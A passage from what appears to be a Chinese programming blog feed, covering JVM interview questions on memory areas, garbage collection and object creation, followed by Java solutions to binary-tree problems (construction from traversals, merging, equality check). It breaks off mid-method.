堆区分开来。</p></li><li><ul><li>运行时常量池：是方法区的一部分，用于存放编译器生成的各种字面量和符号引用。</li></ul></li><li><p>堆内存（线程共享）：所有线程共享的一块区域，垃圾收集器管理的主要区域。目前主要的垃圾回收算法都是分代收集算法，所以 Java 堆中还可以细分为：新生代和老年代；再细致一点的有 Eden 空间、From Survivor 空间、To Survivor 空间等，默认情况下新生代按照8:1:1的比例来分配。根据 Java 虚拟机规范的规定，Java 堆可以处于物理上不连续的内存空间中，只要逻辑上是连续的即可，就像我们的磁盘一样。</p></li><li><p>程序计数器： Java 线程私有，类似于操作系统里的 PC 计数器，它可以看做是当前线程所执行的字节码的行号指示器。如果线程正在执行的是一个 Java 方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址；如果正在执行的是 Native 方法，这个计数器值则为空（Undefined）。此内存区域是唯一一个在 Java 虚拟机规范中没有规定任何 OutOfMemoryError 情况的区域。</p></li><li><p>虚拟机栈（栈内存）：Java线程私有，虚拟机展描述的是Java方法执行的内存模型：每个方法在执行的时候，都会创建一个栈帧用于存储局部变量、操作数、动态链接、方法出口等信息；每个方法调用都意味着一个栈帧在虚拟机栈中入栈到出栈的过程；</p></li><li><p>本地方法栈 ：和Java虚拟机栈的作用类似，区别是该区域为 JVM 提供使用 native 方法的服务</p></li></ol><h4 id="2）对象分配规则？"><a href="#2）对象分配规则？" class="headerlink" title="2）对象分配规则？"></a>2）对象分配规则？</h4><p>答：</p><ul><li>对象优先分配在Eden区，如果Eden区没有足够的空间时，虚拟机执行一次Minor GC。</li><li>大对象直接进入老年代（大对象是指需要大量连续内存空间的对象）。这样做的目的是避免在Eden区和两个Survivor区之间发生大量的内存拷贝（新生代采用复制算法收集内存）。</li><li>长期存活的对象进入老年代。虚拟机为每个对象定义了一个年龄计数器，如果对象经过了1次Minor GC那么对象会进入Survivor区，之后每经过一次Minor GC那么对象的年龄加1，知道达到阀值对象进入老年区。</li><li>动态判断对象的年龄。如果Survivor区中相同年龄的所有对象大小的总和大于Survivor空间的一半，年龄大于或等于该年龄的对象可以直接进入老年代。</li><li>空间分配担保。每次进行Minor GC时，JVM会计算Survivor区移至老年区的对象的平均大小，如果这个值大于老年区的剩余值大小则进行一次Full GC，如果小于检查HandlePromotionFailure设置，如果true则只进行Monitor GC,如果false则进行Full GC。</li></ul><h4 id="3）Java-的内存模型："><a href="#3）Java-的内存模型：" class="headerlink" title="3）Java 的内存模型："></a>3）Java 的内存模型：</h4><p>答：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/6.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/6.png" alt="img"></a></p><p>Java 虚拟机规范中试图定义一种 Java 内存模型（Java Memory Model, JMM）来屏蔽掉各层硬件和操作系统的内存访问差异，以实现让 Java 程序在各种平台下都能达到一致的内存访问效果。</p><p>Java 内存模型规定了所有的变量都存储在主内存（Main Memory）中。每条线程还有自己的工作内存（Working Memory），线程的工作内存中保存了被该线程使用到的变量的主内存副本拷贝，线程对变量的所有操作（读取、赋值等）都必须在主内存中进行，而不能直接读写主内存中的变量。不同的线程之间也无法直接访问对方工作内存中的变量，线程间的变量值的传递均需要通过主内存来完成，线程、主内存、工作内存三者的关系如上图。</p><p><strong>面试官：两个线程之间是如何通信的呢？</strong></p><p>答：在<strong>共享内存</strong>的并发模型里，线程之间共享程序的公共状态，线程之间通过写-读内存中的公共状态来隐式进行通信，典型的共享内存通信方式就是通过共享对象进行通信。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/7.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/7.png" alt="img"></a></p><p>例如上图线程 A 与 线程 B 之间如果要通信的话，那么就必须经历下面两个步骤：</p><ul><li>1.首先，线程 A 把本地内存 A 更新过得共享变量刷新到主内存中去</li><li>2.然后，线程 B 到主内存中去读取线程 A 之前更新过的共享变量</li></ul><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/8.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/8.png" alt="img"></a></p><p>在<strong>消息传递</strong>的并发模型里，线程之间没有公共状态，线程之间必须通过明确的发送消息来显式进行通信，在 Java 中典型的消息传递方式就是 wait() 和 notify()。</p><h4 id="5）内存屏障？"><a href="#5）内存屏障？" class="headerlink" title="5）内存屏障？"></a>5）内存屏障？</h4><p>解析：在这之前应该对重排序的问题有所了解，这里我找到一篇很好的文章分享一下：Java内存访问重排序的研究</p><p>答：内存屏障，又称内存栅栏，是一组处理器指令，用于实现对内存操作的顺序限制。</p><p><strong>面试官：内存屏障为何重要？</strong></p><p>答：对主存的一次访问一般花费硬件的数百次时钟周期。处理器通过缓存（caching）能够从数量级上降低内存延迟的成本这些缓存为了性能重新排列待定内存操 作的顺序。也就是说，程序的读写操作不一定会按照它要求处理器的顺序执行。当数据是不可变的，同时/或者数据限制在线程范围内，这些优化是无害的。如果把 这些优化与对称多处理（symmetric multi-processing）和共享可变状态（shared mutable state）结合，那么就是一场噩梦。当基于共享可变状态的内存操作被重新排序时，程序可能行为不定。一个线程写入的数据可能被其他线程可见，原因是数据 写入的顺序不一致。适当的放置内存屏障通过强制处理器顺序执行待定的内存操作来避免这个问题。</p><h4 id="5）类似-Xms、-Xmn这些参数的含义："><a href="#5）类似-Xms、-Xmn这些参数的含义：" class="headerlink" title="5）类似-Xms、-Xmn这些参数的含义："></a>5）类似-Xms、-Xmn这些参数的含义：</h4><p>答：堆内存分配：</p><ol><li>JVM初始分配的内存由-Xms指定，默认是物理内存的1/64</li><li>JVM最大分配的内存由-Xmx指定，默认是物理内存的1/4</li><li>默认空余堆内存小于40%时，JVM就会增大堆直到-Xmx的最大限制；空余堆内存大于70%时，JVM会减少堆直到 -Xms的最小限制。</li><li>因此服务器一般设置-Xms、-Xmx相等以避免在每次GC 后调整堆的大小。对象的堆内存由称为垃圾回收器的自动内存管理系统回收。</li></ol><p>非堆内存分配：</p><ol><li>JVM使用-XX:PermSize设置非堆内存初始值，默认是物理内存的1/64；</li><li>由XX:MaxPermSize设置最大非堆内存的大小，默认是物理内存的1/4。</li><li>-Xmn2G：设置年轻代大小为2G。</li><li>-XX:SurvivorRatio，设置年轻代中Eden区与Survivor区的比值。</li></ol><h4 id="6）内存泄漏和内存溢出"><a href="#6）内存泄漏和内存溢出" class="headerlink" title="6）内存泄漏和内存溢出"></a>6）内存泄漏和内存溢出</h4><p>答：概念：</p><ol><li>内存溢出指的是内存不够用了。</li><li>内存泄漏是指对象可达，但是没用了。即本该被GC回收的对象并没有被回收</li><li>内存泄露是导致内存溢出的原因之一；内存泄露积累起来将导致内存溢出。</li></ol><p>内存泄漏的原因分析：</p><ol><li>长生命周期的对象引用短生命周期的对象</li><li>没有将无用对象置为null</li></ol><blockquote><p>小结：本小节涉及到 JVM 虚拟机，包括对内存的管理等知识，相对较深。除了以上问题，面试官会继续问你一些比较深的问题，可能也是为了看看你的极限在哪里吧。比如：内存调优、内存管理，是否遇到过内存泄露的实际案例、是否真正关心过内存等。</p></blockquote><h4 id="7）简述一下-Java-中创建一个对象的过程？"><a href="#7）简述一下-Java-中创建一个对象的过程？" class="headerlink" title="7）简述一下 Java 中创建一个对象的过程？"></a>7）简述一下 Java 中创建一个对象的过程？</h4><p>解析：回答这个问题首先就要清楚类的生命周期</p><p>答：下图展示的是类的生命周期流向：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/9.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/9.png" alt="img"></a></p><p>Java中对象的创建就是在堆上分配内存空间的过程，此处说的对象创建仅限于new关键字创建的普通Java对象，不包括数组对象的创建。</p><p>大致过程如下：</p><p><strong>1.检测类是否被加载：</strong></p><p>当虚拟机执行到new时，会先去常量池中查找这个类的符号引用。如果能找到符号引用，说明此类已经被加载到方法区（方法区存储虚拟机已经加载的类的信息），可以继续执行；如果找不到符号引用，就会使用类加载器执行类的加载过程，类加载完成后继续执行。</p><p><strong>2.为对象分配内存：</strong></p><p>类加载完成以后，虚拟机就开始为对象分配内存，此时所需内存的大小就已经确定了。只需要在堆上分配所需要的内存即可。</p><p>具体的分配内存有两种情况：第一种情况是内存空间绝对规整，第二种情况是内存空间是不连续的。</p><ul><li>对于内存绝对规整的情况相对简单一些，虚拟机只需要在被占用的内存和可用空间之间移动指针即可，这种方式被称为指针碰撞。</li><li>对于内存不规整的情况稍微复杂一点，这时候虚拟机需要维护一个列表，来记录哪些内存是可用的。分配内存的时候需要找到一个可用的内存空间，然后在列表上记录下已被分配，这种方式成为空闲列表。</li></ul><p>分配内存的时候也需要考虑线程安全问题，有两种解决方案：</p><ul><li>第一种是采用同步的办法，使用CAS来保证操作的原子性。</li><li>另一种是每个线程分配内存都在自己的空间内进行，即是每个线程都在堆中预先分配一小块内存，称为本地线程分配缓冲（TLAB），分配内存的时候再TLAB上分配，互不干扰。</li></ul><p><strong>3.为分配的内存空间初始化零值：</strong></p><p>对象的内存分配完成后，还需要将对象的内存空间都初始化为零值，这样能保证对象即使没有赋初值，也可以直接使用。</p><p><strong>4.对对象进行其他设置：</strong></p><p>分配完内存空间，初始化零值之后，虚拟机还需要对对象进行其他必要的设置，设置的地方都在对象头中，包括这个对象所属的类，类的元数据信息，对象的hashcode，GC分代年龄等信息。</p><p><strong>5.执行 init 方法：</strong></p><p>执行完上面的步骤之后，在虚拟机里这个对象就算创建成功了，但是对于Java程序来说还需要执行init方法才算真正的创建完成，因为这个时候对象只是被初始化零值了，还没有真正的去根据程序中的代码分配初始值，调用了init方法之后，这个对象才真正能使用。</p><p>到此为止一个对象就产生了，这就是new关键字创建对象的过程。过程如下：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/10.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/10.png" alt="img"></a></p><blockquote><p>参考文章：Java创建对象的过程简介</p></blockquote><p><strong>面试官：对象的内存布局是怎样的？</strong></p><p>答：对象的内存布局包括三个部分：对象头，实例数据和对齐填充。</p><ul><li>对象头：对象头包括两部分信息，第一部分是存储对象自身的运行时数据，如哈希码，GC分代年龄，锁状态标志，线程持有的锁等等。第二部分是类型指针，即对象指向类元数据的指针。</li><li>实例数据：就是数据啦</li><li>对齐填充：不是必然的存在，就是为了对齐的嘛</li></ul><p><strong>面试官：对象是如何定位访问的？</strong></p><p>答：对象的访问定位有两种：句柄定位和直接指针</p><ul><li>句柄定位：Java 堆会画出一块内存来作为句柄池，reference中存储的就是对象的句柄地址，而句柄中包含了对象实例数据与类型数据各自的具体地址信息</li></ul><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/11.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/11.png" alt="img"></a></p><ul><li>直接指针访问：java堆对象的不居中就必须考虑如何放置访问类型数据的相关信息，而reference中存储的直接就是对象地址</li></ul><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/12.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/12.png" alt="img"></a></p><p><strong>比较：使用直接指针就是速度快，使用句柄reference指向稳定的句柄，对象被移动改变的也只是句柄中实例数据的指针，而reference本身并不需要修改。</strong></p><h3 id="三-相关面试题整理"><a href="#三-相关面试题整理" class="headerlink" title="三.  相关面试题整理"></a><strong>三.  相关面试题整理</strong></h3><h4 id="1）64-位-JVM-中，int-的长度是多数？"><a href="#1）64-位-JVM-中，int-的长度是多数？" class="headerlink" title="1）64 位 JVM 中，int 的长度是多数？"></a>1）64 位 JVM 中，int 的长度是多数？</h4><p>答：Java 中，int 类型变量的长度是一个固定值，与平台无关，都是 32 位或者 4 个字节。意思就是说，在 32 位 和 64 位 的Java 虚拟机中，int 类型的长度是相同的。</p><h4 id="2）怎样通过-Java-程序来判断-JVM-是-32-位-还是-64-位？"><a href="#2）怎样通过-Java-程序来判断-JVM-是-32-位-还是-64-位？" class="headerlink" title="2）怎样通过 Java 程序来判断 JVM 是 32 位 还是 64 位？"></a>2）怎样通过 Java 程序来判断 JVM 是 32 位 还是 64 位？</h4><p>答：Sun有一个Java System属性来确定JVM的位数：32或64：</p><pre class=" language-java"><code class="language-java">sun<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>data<span class="token punctuation">.</span>model<span class="token operator">=</span><span class="token number">32</span> <span class="token comment" spellcheck="true">// 32 bit JVMsun.arch.data.model=64 // 64 bit JVM</span></code></pre><p>我可以使用以下语句来确定 JVM 是 32 位还是 64 位：</p><pre class=" language-java"><code class="language-java">System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"sun.arch.data.model"</span><span class="token punctuation">)</span></code></pre><h4 id="3）32-位-JVM-和-64-位-JVM-的最大堆内存分别是多数？"><a href="#3）32-位-JVM-和-64-位-JVM-的最大堆内存分别是多数？" class="headerlink" title="3）32 位 JVM 和 64 位 JVM 的最大堆内存分别是多数？"></a>3）32 位 JVM 和 64 位 JVM 的最大堆内存分别是多数？</h4><p>答：理论上说上 32 位的 JVM 堆内存可以到达 2^32，即 4GB，但实际上会比这个小很多。不同操作系统之间不同，如 Windows 系统大约 1.5 GB，Solaris 大约 3GB。64 位 JVM允许指定最大的堆内存，理论上可以达到 2^64，这是一个非常大的数字，实际上你可以指定堆内存大小到 100GB。甚至有的 JVM，如 Azul，堆内存到 1000G 都是可能的。</p><h4 id="4）你能保证-GC-执行吗？"><a href="#4）你能保证-GC-执行吗？" class="headerlink" title="4）你能保证 GC 执行吗？"></a>4）你能保证 GC 执行吗？</h4><p>答：不能，虽然你可以调用 System.gc() 或者 Runtime.gc()，但是没有办法保证 GC 的执行。</p><h4 id="5）怎么获取-Java-程序使用的内存？堆使用的百分比？"><a href="#5）怎么获取-Java-程序使用的内存？堆使用的百分比？" class="headerlink" title="5）怎么获取 Java 程序使用的内存？堆使用的百分比？"></a>5）怎么获取 Java 程序使用的内存？堆使用的百分比？</h4><p>答：可以通过 java.lang.Runtime 类中与内存相关方法来获取剩余的内存，总内存及最大堆内存。通过这些方法你也可以获取到堆使用的百分比及堆内存的剩余空间。Runtime.freeMemory() 方法返回剩余空间的字节数，Runtime.totalMemory() 方法总内存的字节数，Runtime.maxMemory() 返回最大内存的字节数。</p><h4 id="6）Java-中堆和栈有什么区别？"><a href="#6）Java-中堆和栈有什么区别？" class="headerlink" title="6）Java 中堆和栈有什么区别？"></a>6）Java 中堆和栈有什么区别？</h4><p>答：JVM 中堆和栈属于不同的内存区域，使用目的也不同。栈常用于保存方法帧和局部变量，而对象总是在堆上分配。栈通常都比堆小，也不会在多个线程之间共享，而堆被整个 JVM 的所有线程共享。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/13.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/13.png" alt="img"></a></p><h4 id="7）CMS垃圾收集器执行过程？"><a href="#7）CMS垃圾收集器执行过程？" class="headerlink" title="7）CMS垃圾收集器执行过程？"></a>7）CMS垃圾收集器执行过程？</h4><p>答：</p><ul><li><p>初始标记(STW)</p><p>该阶段进行可达性分析，标记GC ROOT能<strong>直接关联</strong>到的对象。</p><p>注意是直接关联间接关联的对象在下一阶段标记。</p></li><li><p>并发标记</p><p>该阶段进行GC ROOT TRACING，在第一个阶段被暂停的线程重新开始运行。<br>由前阶段标记过的对象出发，所有可到达的对象都在本阶段中标记。</p></li><li><p>并发预清理</p><p>前面我们讲过，CMS是以获取最短停顿时间为目的的GC。</p><p>重标记需要STW（Stop The World），因此重标记的工作尽可能多的在并发阶段完成来减少STW的时间。</p><p>此阶段标记从<strong>新生代晋升的对象</strong>、<strong>新分配到老年代的对象</strong>以及在<strong>并发阶段被修改了的对象</strong>。</p></li><li><p>重标记(STW)</p><p>暂停所有用户线程，重新扫描堆中的对象，进行可达性分析,标记活着的对象。</p><p>有了前面的基础，这个阶段的工作量被大大减轻，停顿时间因此也会减少。</p><p>注意这个阶段是多线程的。</p></li><li><p>并发清理</p><p>用户线程被重新激活，同时清理那些无效的对象。</p></li><li><p>重置</p><p>CMS清除内部状态，为下次回收做准备。 </p></li></ul><p><strong>-END-</strong></p><p>本文转载自:  <a href="https://mp.weixin.qq.com/s/SMXeSMllqmeV8qdreHn8Jw" target="_blank" rel="noopener">面试系列-Jvm看这篇就够了</a></p>]]></content>
      
      
      <categories>
          
          <category> 面试系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用前序和中序遍历序列构建二叉树</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/yong-zhong-xu-he-hou-xu-bian-li-xu-lie-gou-jian-er-cha-shu/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/yong-zhong-xu-he-hou-xu-bian-li-xu-lie-gou-jian-er-cha-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="用前序和中序遍历序列构建二叉树"><a href="#用前序和中序遍历序列构建二叉树" class="headerlink" title="用前序和中序遍历序列构建二叉树"></a>用前序和中序遍历序列构建二叉树</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一棵二叉树的前序和中序遍历序列，你要根据这两个序列构建这棵二叉树。假设这棵二叉树节点上没有重复的数字。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的前序遍历序列和中序遍历序列分别是：前序遍历序列：1, 2, 4, 8, 16中序遍历序列：2, 1, 8, 4, 16你要返回用它们构建出的二叉树，是：<span class="token code keyword">    1</span>  /   \ 2     4<span class="token code keyword">      / \</span><span class="token code keyword">     8  16</span></code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> TreeNode <span class="token function">buildTree</span><span class="token punctuation">(</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> pre<span class="token punctuation">,</span> <span class="token keyword">int</span> preStart<span class="token punctuation">,</span> <span class="token keyword">int</span> preEnd<span class="token punctuation">,</span>    <span class="token keyword">int</span> inStart<span class="token punctuation">,</span> Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> Integer<span class="token operator">></span> inPos<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>preStart <span class="token operator">></span> preEnd<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    TreeNode root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span>pre<span class="token punctuation">[</span>preStart<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> rootIdx <span class="token operator">=</span> inPos<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>pre<span class="token punctuation">[</span>preStart<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> leftLen <span class="token operator">=</span> rootIdx <span class="token operator">-</span> inStart<span class="token punctuation">;</span>    root<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">buildTree</span><span class="token punctuation">(</span>pre<span class="token punctuation">,</span> preStart<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> preStart<span class="token operator">+</span>leftLen<span class="token punctuation">,</span> inStart<span class="token punctuation">,</span> inPos<span class="token punctuation">)</span><span class="token punctuation">;</span>    root<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">buildTree</span><span class="token punctuation">(</span>pre<span class="token punctuation">,</span> preStart<span class="token operator">+</span>leftLen<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> preEnd<span class="token punctuation">,</span> rootIdx<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> inPos<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> root<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> TreeNode <span class="token function">buildTree</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> pre<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> in<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> Integer<span class="token operator">></span> inPos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> in<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>      inPos<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>in<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">buildTree</span><span class="token punctuation">(</span>pre<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> pre<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> inPos<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合并二叉树</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/he-bing-er-cha-shu/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/he-bing-er-cha-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="合并二叉树"><a href="#合并二叉树" class="headerlink" title="合并二叉树"></a>合并二叉树</h2><p><strong>问题</strong></p><p>这个题目说的是，给你两棵二叉树，你要把它们合并起来形成一棵新的二叉树。合并规则是对应节点上的数字相加得到新节点的数字，如果有一个节点为空，则直接使用非空节点的数字，如果两个节点都为空，则合并后也为空。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的两棵二叉树是：<span class="token code keyword">    1</span>   / \  3   5   \   \<span class="token code keyword">    7   9</span>和<span class="token code keyword">     2</span><span class="token code keyword">    / \</span>   4   6  / 8你要返回合并后的二叉树是：<span class="token code keyword">     3</span><span class="token code keyword">    / \</span>   7   11  / \    \ 8   7    9</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> TreeNode <span class="token function">mergeTrees</span><span class="token punctuation">(</span>TreeNode t1<span class="token punctuation">,</span> TreeNode t2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t1 <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> t2 <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t1 <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> t2 <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> t1<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t2 <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> t1 <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> t2<span class="token punctuation">;</span>    t1<span class="token punctuation">.</span>val <span class="token operator">+=</span> t2<span class="token punctuation">.</span>val<span class="token punctuation">;</span>    t1<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">mergeTrees</span><span class="token punctuation">(</span>t1<span class="token punctuation">.</span>left<span class="token punctuation">,</span> t2<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    t1<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">mergeTrees</span><span class="token punctuation">(</span>t1<span class="token punctuation">.</span>right<span class="token punctuation">,</span> t2<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> t1<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断二叉树是否相同</title>
      <link href="/2018/12/28/suan-fa/er-cha-shu/pan-duan-er-cha-shu-shi-fou-xiang-tong/"/>
      <url>/2018/12/28/suan-fa/er-cha-shu/pan-duan-er-cha-shu-shi-fou-xiang-tong/</url>
      
        <content type="html"><![CDATA[<h2 id="判断二叉树是否相同"><a href="#判断二叉树是否相同" class="headerlink" title="判断二叉树是否相同"></a>判断二叉树是否相同</h2><p><strong>问题</strong></p><p>这个题目说的是，给你两个二叉树，你要判断它们是否相同。这里所谓相同，指的是两棵树结构相同，并且相应节点上的数值相等。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的两棵二叉树都是：   1          1  / \        / \ 2   4      2   4它们的结构相同，相应节点上的值也相等，因此返回 true。 如果另一棵树是：   1  / \ 2   5或<span class="token code keyword">    1</span>   /  2 /4两棵树则不相同，返回 false。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSameTreeRecursive</span><span class="token punctuation">(</span>TreeNode p<span class="token punctuation">,</span> TreeNode q<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> q <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> null <span class="token operator">||</span> q <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> p<span class="token punctuation">.</span>val <span class="token operator">==</span> q<span class="token punctuation">.</span>val <span class="token operator">&amp;&amp;</span>      <span class="token function">isSameTreeRecursive</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>left<span class="token punctuation">,</span> q<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>      <span class="token function">isSameTreeRecursive</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>right<span class="token punctuation">,</span> q<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSameTreeIterative</span><span class="token punctuation">(</span>TreeNode p<span class="token punctuation">,</span> TreeNode q<span class="token punctuation">)</span> <span class="token punctuation">{</span>    